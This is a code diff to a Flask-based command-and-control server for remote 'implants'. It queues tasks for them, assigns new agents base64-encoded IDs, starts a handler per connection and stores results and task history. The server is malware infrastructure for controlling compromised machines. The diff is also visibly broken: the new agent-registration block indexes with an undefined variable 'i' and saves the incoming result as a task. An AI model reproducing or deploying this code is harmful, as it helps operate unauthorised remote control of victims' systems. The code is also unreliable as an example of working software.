@@ -1,6 +1,8 @@
+import uuid
 import json
 import string
 import secrets
+import base64
 
 from flask import request, Response
 from flask_restful import Resource
@@ -25,17 +27,19 @@ class Tasks(Resource):
         obj_num = len(body)
         # For each Task object, add it to the database
         for i in range(obj_num):
+            # Add a task UUID to each task object for tracking
+            json_obj[i]['task_id'] = str(uuid.uuid4())
             # Save Task object to database
             Task(**json_obj[i]).save()
             # Load the options provided for the task into an array for tracking in history
             task_options = []
             for key in json_obj[i].keys():
-                # Anything that comes after task_type and agent_id is treated as an option
-                if (key != "task_type" and key != "agent_id"):
+                # Anything that comes after task_type and task_id is treated as an option
+                if (key != "task_type" and key != "task_id"):
                     task_options.append(key + ": " + json_obj[i][key])
             # Add to task history
             TaskHistory(
-                agent_id=json_obj[i]['agent_id'],
+                task_id=json_obj[i]['task_id'],
                 task_type=json_obj[i]['task_type'],
                 task_object=json.dumps(json_obj),
                 task_options=task_options,
@@ -58,34 +62,56 @@ class Results(Resource):
     def post(self):
         # Check if results from the implant are populated
         if str(request.get_json()) != '{}':
-            new_connection = False
+            
             # logging should be added here at some point
+
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
-            print("Received implant response: {}".format(body))
             json_obj = json.loads(json.dumps(body))
-            Result(**json_obj).save()
+            # Add a result UUID to each result object for tracking
+            json_obj['result_id'] = str(uuid.uuid4())
             # If the agent is new, set a unique agent id, start a new handler, and add it to the agent list
             if(json_obj['agent_id'] == "MA=="):
-                new_connection = True
                 # Generate unique agent id
                 alphabet = string.ascii_letters + string.digits
                 agent_id = ''.join(secrets.choice(alphabet) for i in range(32))
-                json_obj['agent_id'] = agent_id + "=="
+                agent_id_bytes = agent_id.encode("ascii")
+                base_64_bytes = base64.b64encode(agent_id_bytes)
+                base_64_agent_id = base_64_bytes.decode("ascii")
+                json_obj['agent_id'] = base_64_agent_id
                 # Create new handler for connection
                 newConn = Handler(agent_id)
                 newConn.start()
+
                 # Add new task for agent to change agent_id
                 new_agent_task = {
                     "task_type": "configure",
                     "agent_id": agent_id
                 }
-                tasks = json.dumps(new_agent_task)
-            if(not new_connection):
-                # Serve latest tasks to implant
-                tasks = Task.objects().to_json()
-                # Clear tasks so they don't execute twice
-                Task.objects().delete()
+                # Add a task UUID to task object for tracking
+                json_obj['task_id'] = str(uuid.uuid4())
+                # Save Task object to database
+                Task(**json_obj).save()
+                # Load the options provided for the task into an array for tracking in history
+                task_options = []
+                for key in json_obj.keys():
+                    # Anything that comes after task_type and task_id is treated as an option
+                    if (key != "task_type" and key != "task_id"):
+                        task_options.append(key + ": " + json_obj[i][key])
+                # Add to task history
+                TaskHistory(
+                    task_id=json_obj[i]['task_id'],
+                    task_type=json_obj[i]['task_type'],
+                    task_object=json.dumps(json_obj),
+                    task_options=task_options,
+                    task_results=""
+                ).save()
+                
+            Result(**json_obj).save()
+            # Serve latest tasks to implant
+            tasks = Task.objects().to_json()
+            # Clear tasks so they don't execute twice
+            Task.objects().delete()
             return Response(tasks, mimetype="application/json", status=200)
         else:
             # Serve latest tasks to implant
@@ -109,17 +135,15 @@ class History(Resource):
         for i in range(len(json_obj)):
             for field in json_obj[i]:
                 result_obj = {
-                    "agent_id": field,
+                    "task_id": field,
                     "task_results": json_obj[i][field]
                 }
                 result_obj_collection.append(result_obj)
         # For each result in the collection, check for a corresponding task ID and if
         # there's a match, update it with the results. This is hacky and there's probably
         # a more elegant solution to update tasks with their results when they come in...
-        # THIS IS BROKEN BECAUSE OF THE SWITCH TO AGENT_ID #
-        # FIND A NEW SOLUTION #
         for result in result_obj_collection:
-            if TaskHistory.objects(agent_id=result["agent_id"]):
-                TaskHistory.objects(agent_id=result["agent_id"]).update_one(
+            if TaskHistory.objects(task_id=result["task_id"]):
+                TaskHistory.objects(task_id=result["task_id"]).update_one(
                     set__task_results=result["task_results"])
         return Response(task_history, mimetype="application/json", status=200)
